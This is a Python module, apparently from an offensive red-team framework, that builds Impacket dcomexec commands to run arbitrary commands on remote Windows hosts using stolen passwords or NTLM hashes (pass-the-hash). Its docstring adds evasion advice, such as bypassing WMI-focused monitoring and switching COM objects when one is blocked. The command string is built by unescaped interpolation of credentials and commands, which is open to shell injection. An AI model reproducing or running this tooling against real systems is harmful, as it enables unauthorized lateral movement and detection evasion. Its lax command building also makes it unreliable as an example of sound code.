"""
DCOM Remote Execution using Impacket's dcomexec
Alternative to WMI using Distributed COM
"""

import sys
from pathlib import Path
from typing import Optional, Tuple

# Add parent to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

from base import BaseExecutionMethod
from ..core.models import ExecutionMethod, Credential


class DCOMExecutionMethod(BaseExecutionMethod):
    """
    Remote execution via DCOM using Impacket's dcomexec

    DCOM (Distributed Component Object Model) provides another
    avenue for remote execution, similar to WMI but using
    different COM objects.

    dcomexec supports multiple DCOM objects:
        - MMC20.Application (default)
        - ShellWindows
        - ShellBrowserWindow

    Advantages:
        - Alternative to WMI when WMI is blocked
        - Supports both password and hash authentication
        - Uses legitimate Windows infrastructure
        - May bypass some monitoring focused on WMI

    Disadvantages:
        - Requires DCOM connectivity
        - May trigger COM-specific monitoring
        - Some AV/EDR specifically watch DCOM

    Detection:
        - Event ID 4688 (Process Creation)
        - DCOM traffic on RPC ports
        - COM object instantiation logs

    OPSEC Note:
        - DCOM is increasingly monitored
        - Try different COM objects if one is blocked
        - Consider firewall rules blocking DCOM
    """

    method = ExecutionMethod.DCOM
    supports_hash = True
    supports_password = True

    def __init__(self, timeout: int = 30, dcom_object: str = "MMC20"):
        """
        Initialize DCOM execution method

        Args:
            timeout: Command timeout
            dcom_object: DCOM object to use (MMC20, ShellWindows, ShellBrowserWindow)
        """
        super().__init__(timeout)
        self.dcom_object = dcom_object

    def build_command(self, target: str, credential: Credential,
                      command: str) -> str:
        """
        Build dcomexec command

        Formats:
            Password: dcomexec.py domain/user:'password'@target 'command'
            Hash: dcomexec.py domain/user@target -hashes :hash 'command'
        """
        if credential.password:
            cmd = (
                f"dcomexec.py "
                f"{credential.domain}/{credential.username}:'{credential.password}'@{target} "
                f"'{command}'"
            )
        else:
            cmd = (
                f"dcomexec.py "
                f"{credential.domain}/{credential.username}@{target} "
                f"-hashes :{credential.ntlm_hash} "
                f"'{command}'"
            )

        # Add object selection if not default
        if self.dcom_object != "MMC20":
            cmd += f" -object {self.dcom_object}"

        return cmd

    def parse_output(self, output_text: str, stderr: str) -> Tuple[bool, Optional[str]]:
        """
        Parse dcomexec output

        Args:
            output_text: stdout from command
            stderr: stderr from command

        Returns:
            Tuple of (success, error_message)
        """
        combined = (output_text + stderr).lower()

        # Check for common errors
        error_indicators = [
            ('access denied', 'Access denied'),
            ('rpc_s_access_denied', 'RPC access denied'),
            ('dcom', 'DCOM connection error'),
            ('error', 'Execution error'),
            ('connection refused', 'Connection refused'),
            ('timed out', 'Connection timed out')
        ]

        for indicator, message in error_indicators:
            if indicator in combined:
                return False, message

        # If we got output without errors, success
        if output_text.strip():
            return True, None

        # DCOM might return empty for some commands
        # Check if it's just a non-output command
        if not stderr or 'error' not in stderr.lower():
            return True, None

        return False, "Execution may have failed"